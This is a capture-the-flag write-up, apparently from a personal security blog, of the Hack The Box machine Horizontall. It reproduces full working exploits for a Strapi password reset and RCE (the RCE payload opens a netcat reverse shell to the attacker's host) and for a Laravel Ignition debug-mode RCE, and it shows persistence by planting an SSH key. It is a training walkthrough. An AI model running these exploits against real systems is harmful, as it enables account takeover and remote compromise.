---
layout: single
title: HTB - Horinzontall
excerpt: "Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, change users passwords and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE)."
date: 2022-01-06
classes: wide
header:
  teaser: /assets/images/img-horizontall/portada.png
  teaser_home_page: true
  icon: /assets/images/img-horizontall
categories:
  - CTF
  - Pentest
tags:
  - Hack the box
  - Linux
  - CVE
  - RCE
---

Horizontall is a linux machine with easy difficulty level both in the exploitation phase and the privilege escalation is cataloged as medium difficulty, this machine uses the cms strapi version 3.0 beta that has vulnerabilities such as RCE, changes users passwords, and also the machine has an http server running on port 8000 that is running laravel version 8 that has the vulnerability CVE-2021-3129 (RCE).

<p align = "center">
<img src = "/assets/images/img-horizontall/portada.png">
</p>

Machine rating according to the people.

<p align = "center">
<img src = "/assets/images/img-horizontall/calificacion.png">
</p>

Machine matrix:

<p align = "center">
<img src = "/assets/images/img-horizontall/matrix.png">
</p>

The first thing we are going to do is to create a file with the machine name, and inside of that file with ***mkt*** we are going to create to following directories (the mkt function remember that I have it defined in the ***~/.zshr*** to create those directories.). 

<p align = "center">
<img src = "/assets/images/img-horizontall/captura1.png">
</p>

## Recognition

First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128. In my machine I have defined a python script that through the ttl reports me if it is a windows or linux machine in a more elegant way, in the case if we don't remember which ttl belongs to which OS.

<p align = "center">
<img src = "/assets/images/img-horizontall/system1.png">
</p>

wichsystem script:

```python
#!/usr/bin/python3
#coding: utf-8
 
import re, sys, subprocess
 
# python3 wichSystem.py YOURIP 
 
if len(sys.argv) != 2:
    print("\n[!] Uso: python3 " + sys.argv[0] + " <direccion-ip>\n")
    sys.exit(1)
 
def get_ttl(ip_address):
 
    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
    (out,err) = proc.communicate()
 
    out = out.split()
    out = out[12].decode('utf-8')
 
    ttl_value = re.findall(r"\d{1,3}", out)[0]
 
    return ttl_value
 
def get_os(ttl):
 
    ttl = int(ttl)
 
    if ttl >= 0 and ttl <= 64:
        return "Linux"
    elif ttl >= 65 and ttl <= 128:
        return "Windows"
    else:
        return "Not Found"
 
if __name__ == '__main__':
 
    ip_address = sys.argv[1]
 
    ttl = get_ttl(ip_address)
 
    os_name = get_os(ttl)
    print("\n%s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))
```

## Scanning - Ports recognition

I am going to perform a tcp syn scan by adding the ***min-rate*** parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.

```
# Nmap 7.92 scan initiated Mon Dec 27 17:13:35 2021 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.11.105
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.105 ()   Status: Up
Host: 10.10.11.105 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
# Nmap done at Mon Dec 27 17:13:46 2021 -- 1 IP address (1 host up) scanned in 11.21 seconds
```
Basically i save it in the grepable format is that i have a function defined in the ***~/.zshrc*** called extractports that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura3.png">
</p>

Extractports script:

```bash
#!/bin/bash

function extractPorts(){
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
        cat extractPorts.tmp; rm extractPorts.tmp
}
```

And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).

```
# Nmap 7.92 scan initiated Mon Dec 27 17:15:26 2021 as: nmap -sCV -p22,80 -oN targeted 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 27 17:15:38 2021 -- 1 IP address (1 host up) scanned in 12.69 seconds
```
As there is a web server on port 80 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc. It reports that it cannot recognize the address ***horizontall.htb*** and means that virtual hosting is being applied.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura4.png">
</p>

So what we are going to do in the ***/etc/hosts*** file we are going to specify the ip of the victim machine and the domain.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura5.png">
</p>

We access on the website with the domain and the wappalyzer reports the following information about the web.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura7.png">
</p>

The web page had a contact form and i wanted to test if the web was vulnerable to xss attacks, but the contact form can not send the request to the server.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura8.png">
</p>

Reviewing the code of the page i found something interesting we see that there is a subdomain that could lead us to something, let's see what it is.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura10.png">
</p>

Before accessing in this subdomain, we will proceed with the fuzzing phase to see if there are more routes on the web, there is also a dictionary to fuzz if there is any subdomain under a domain and in this case we see that it reports the subdomain that we just saw in the code of the website.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura11.png">
</p>

I then proceeded to fuzzing the subdomain that i found and the gobuster reports me in the terminal the routes that has been found.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura12.png">
</p>

And accessing in the subdomain we see that in the admin path there is a panel to log in the strapi cms.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura13.png">
</p>

I tried to access the path ***users*** and it says ***forbidden*** that means that the server has found the path but we don't have access.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura14.png">
</p>

I tried to test if the site was vulnerable to sql injections, but in this case we see that it is not.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura15.png">
</p>

At the moment we don't have any valid credentials to access, let's see with ***searchsploit*** what vulnerabilities has the strapi cms. and we see that there are critical vulnerabilities like the RCE in the 3.0 beta version and also to add passwords, hmm interesting.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura16.png">
</p>

Looking the script what it allows us is with a valid user that is created in strapi we can change the password, and this case what i have done is to use the user admin to try if it's works, the subdomain and the last adding a password for this user and save the file.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura17.png">
</p>

The exploit:

```python
# Exploit Title: Strapi 3.0.0-beta - Set Password (Unauthenticated)
# Date: 2021-08-29
# Exploit Author: David Anglada [CodiObert]
# Vendor Homepage: https://strapi.io/
# Version: 3.0.0-beta
# Tested on: Linux
# CVE: CVE-2019-18818

#!/usr/bin/python

import requests
import sys
import json

userEmail = "admin@horizontall.htb"
strapiUrl = "http://api-prod.horizontall.htb"
newPassword = "code12345"

s = requests.Session()

# Get strapi version
strapiVersion = json.loads(s.get("{}/admin/strapiVersion".format(strapiUrl)).text)

print("[*] strapi version: {}".format(strapiVersion["strapiVersion"]))

# Validate vulnerable version
if strapiVersion["strapiVersion"].startswith('3.0.0-beta') or strapiVersion["strapiVersion"].startswith('3.0.0-alpha'):
	# Password reset
	print("[*] Password reset for user: {}".format(userEmail))
	resetPasswordReq={"email":userEmail, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(strapiUrl)}
	s.post("{}/".format(strapiUrl), json=resetPasswordReq)

	# Set new password
	print("[*] Setting new password")
	exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
	r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit)

	# Check if the password has changed
	if "username" in str(r.content):
		print("[+] New password '{}' set for user {}".format(newPassword, userEmail))
	else:
		print("\033[91m[-] Something went wrong\033[0m")
		sys.exit(1)
else:
	print("\033[91m[-] This version is not vulnerable\033[0m")
	sys.exit(1)
```


According to the indication of this exploit we execute the script as follow command, and it should change the user's password.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura18.png">
</p>

Ok so let's check if it's work, and we can see that i have access to the admin account on strapi. And we can see the strapi version and affectively it is the vulnerable version.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura19.png">
</p>

So, in the user section we can see more users and there password hashes. 

<p align = "center">
<img src = "/assets/images/img-horizontall/captura20.png">
</p>

And there was a file upload section, i tried to upload a malicious file or a malicious plugin to somehow gain access to the victim machine, but it didn't work.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura21.png">
</p>

Remember that before with ***seacrhsploit*** that reported us strapi exploits for RCE, in my case for some reason i don't know why it din't work thos two exploits so i decided to look for one and i found the following exploit. And something to mention this strapi vulnerability is registered as ***CVE-2019-19609-EXPLOIT***.

```python
#!/bin/python
import requests
import argparse

parser = argparse.ArgumentParser(description='Exploit for CVE-2019-16609 in Strapi')
parser.add_argument('-d', '--domain', type=str, help='Target IP or domain', required=True)
parser.add_argument('-jwt', '--jwtoken', type=str, help='Json web token authenticate', required=True)
parser.add_argument('-l', '--lhost', type=str, help='Your host', required=True)
parser.add_argument('-p', '--port', type=int, help='Port your machine is listening on', required=True)
args = parser.parse_args()

url = args.domain
port = args.port
jwt = args.jwtoken
host = args.lhost
urlVuln = "http://"+url + "/admin/plugins/install"

print("[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)")
print("[+] Remember to start listening to the port "+str(port)+" to get a reverse shell") 

headers = {'Host': url, 'Authorization': 'Bearer '+jwt, 'Content-Type': 'application/json', 'Content-Length': '131', 'Connection': 'close'}

#feel free to modify the payload
data = '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+host+' '+str(port)+' >/tmp/f)", "port":"80"}' #Depending on the scenario, you will have to change the port here

print("[+] Sending payload... Check if you got shell")

r = requests.post(urlVuln, headers=headers, data=data, verify=False)

print("[+] Payload sent. Response:")
print(r)
print(r.text)
```

So if we want to run the exploit it tells us that we need a jwt from a valid user, in this case i use burpsuite and i will use the jwt of the admin user. 

<p align = "center">
<img src = "/assets/images/img-horizontall/captura22.png">
</p>

So what i have done is in one window to execute the exploit by putting the admin user jwt and in the second window to listen connections via netcat on the port 1234. And as we can see we have received a connection from the victim machine to our attacker machine. 

***-d***: the parameter -d it's for specify the domain.

***-jwt***: specify that we gon a use jwt token.

***-l***: for liesten (in this case the attacker machine ip address).

***-p***: specify the port (in this case the attacker port).

<p align = "center">
<img src = "/assets/images/img-horizontall/captura23.png">
</p>

Once we have access to the machine, we will spawn a pseudo console with python and we will export two environment variables that is ***xterm*** to able to use command like ***clear*** and the shell ***bash***.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura24.png">
</p>

We are going to list all users that has created on the system, and we can see that there is a user with id 1000 called ***developer***. Let's access to the home directory of that user.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura25.png">
</p>

And now we can see the first flag which is the ***user.txt*** that we are going to submit in the hackthebox website.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura26.png">
</p>

I tried to access the ***myproject*** directory but i don't have permissions to access and also the php file, hmm interesting. 

<p align = "center">
<img src = "/assets/images/img-horizontall/captura27.png">
</p>

The only directory i had access to was the api directory, looking through the files in that particular directory i found database credentials for the user ***developer***. 

<p align = "center">
<img src = "/assets/images/img-horizontall/captura28.png">
</p>

What i did was to use those credentials to access in the database, to see if there was anything interesting.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura29.png">
</p>

I have accessed the strapi database and we can see the credentials of the admin user that we have been exploited.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura30.png">
</p>

I tried to access some of the tables in the strapi database to see if there was any useful information to escalate privileges, but some tables would not let me access them. So to escalate privileges is not going in this way.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura31.png">
</p>

So what i did is with the command ***netstat*** to see if there was any internal service running in any port, and i found the port 8000 which is listening but it does not show the service that is running, i tried several methods and commands to find out what specific service was running on that port, but none of them worked.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura32.png">
</p>

until i saw on port 6004 was running chisel, so i decided to investigate what it was.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura33.png">
</p>

As we can access the ssh route, what we can do is to creata tunnel through ssh (in this case we are going to use ***SSH local port forwarding*** ) to access on the port 8000 as if it were localhost (since we must remember that we cannot access that port via localhost because we are connected to a remote machine) and from there know which service is running.

More info: [SSH port forwarding](https://www.ssh.com/academy/ssh/tunneling/example)

<p align = "center">
<img src = "/assets/images/img-horizontall/captura34.png">
</p>

On our attacker's machine we will generate an ssh key.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura35.png">
</p>

Now what we are going to do is copy the public key that we just generated and paste it on the victim machine in the file ***authorized_keys***.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura36.png">
</p>

Once we have uploaded our public key on the victim machine what we are gon a do is with ssh with the ***-L*** parameter specify the port forwarding, we have to forward port 8000 of the victim machine to our port 8000 of our attacker machine so that we can browse on that port on our localhost to see what's in the particular port.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura37.png">
</p>

And if now in our attacker's machine we access through localhost with the port 8000 we can see that we can visualize the content of the website of the victim machine, and we can see that the website is using laravel and if we look well below it tells us the version of the framework.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura38.png">
</p>

And if we search with ***searchsploit*** we can see that there are exploits and vulnerabilities for laravel version 8 and one of the most critical. And btw this vunlerability is registered as ***CVE-2021-3129***, and this vunlerability affects the function ***file_get_contents()*** and ***file_put_contents()*** of the component debug mode in laravel.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura39.png">
</p>

The exploit:

```python
# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
# Date: 1.14.2021
# Exploit Author: SunCSR Team
# Vendor Homepage: https://laravel.com/
# References:
# https://www.ambionics.io/blog/laravel-debug-rce
# https://viblo.asia/p/6J3ZgN8PKmB
# Version: <= 8.4.2
# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce


#!/usr/bin/env python3

import requests, sys, re, os

header={
    "Accept": "application/json"
}

data = {
        "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",\
        "parameters":{
            "variableName":"cm0s",
            "viewFile":""
        }
    }

def clear_log(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    while (requests.post(url=url, json=data, headers=header, verify=False).status_code != 200): pass
    requests.post(url=url, json=data, headers=header, verify=False)
    requests.post(url=url, json=data, headers=header, verify=False)

def create_payload(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and f'file_get_contents({viewFile})' in resp.text:
        return True
    return False

def convert(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 200:
        return True
    return False

def exploited(url='', viewFile=''):

    global data

    data['parameters']['viewFile'] = viewFile
    resp = requests.post(url=url, json=data, headers=header, verify=False)
    if resp.status_code == 500 and 'cannot be empty' in resp.text:
        m = re.findall(r'\{(.|\n)+\}((.|\n)*)', resp.text)
        print()
        print(m[0][1])

def generate_payload(command='', padding=0):
    if '/' in command:
        command = command.replace('/', '\/')
        command = command.replace('\'', '\\\'')
    os.system(r'''php -d'phar.readonly=0' ./phpggc/phpggc monolog/rce1 system '%s' --phar phar -o php://output | base64 -w0 | sed -E 's/./\0=00/g' > payload.txt'''%(command))
    payload = ''
    with open('payload.txt', 'r') as fp:
        payload = fp.read()
        payload = payload.replace('==', '=3D=')
        for i in range(padding):
            payload += '=00'
    os.system('rm -rf payload.txt')
    return payload


def main():

    if len(sys.argv) < 4:
        print('Usage:  %s url path-log command\n'%(sys.argv[0]))
        print('\tEx: %s http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log \'id\''%(sys.argv[0]))
        exit(1)

    if not os.path.isfile('./phpggc/phpggc'):
        print('Phpggc not found!')
        print('Run command: git clone https://github.com/ambionics/phpggc.git')
        os.system('git clone https://github.com/ambionics/phpggc.git')

    url = sys.argv[1]
    path_log = sys.argv[2]
    command = sys.argv[3]
    padding = 0

    payload = generate_payload(command, padding)
    if not payload:
        print('Generate payload error!')
        exit(1)

    if 'http' not in url and 'https' not in url:
        url = 'http'+url
    else:
        url = url+'/_ignition/execute-solution'

    print('\nExploit...')
    clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
    create_payload(url, 'AA')
    create_payload(url, payload)
    while (not convert(url, 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s'%(path_log))):
        clear_log(url, 'php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'%(path_log))
        create_payload(url, 'AA')
        padding += 1
        payload = generate_payload(command, padding)
        create_payload(url, payload)

    exploited(url, 'phar://%s'%(path_log))

if __name__ == '__main__':
    main()
```

## Privilege Escalation

In this case i am going to use the RCE exploit that i just found with searchsploit, if we run the exploit it tells us how to run the exploit, before we have seen that it didn't allow us to access the ***myproject*** directory of the developer user, it could be the laravel web files can be in that directory. Let's check.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura40.png">
</p>

In this case the laravel.log is used because it is where it contains the logs of all the debugging and there it can contain those two functions mentioned above.

In this case as we have made the forwarding of port 8000 in url option the localhost, and in this case i will test with the directory ***myproject*** to see if the RCE works and we can see it's works!!!, and as we are as root user and with this we can visualize the last flag which is a ***root.txt***. And now what we can do is a reverse shell or see the id_rsa of the root user to connect via ssh, but i make challenge for you to do that 😉.

<p align = "center">
<img src = "/assets/images/img-horizontall/captura41.png">
</p>
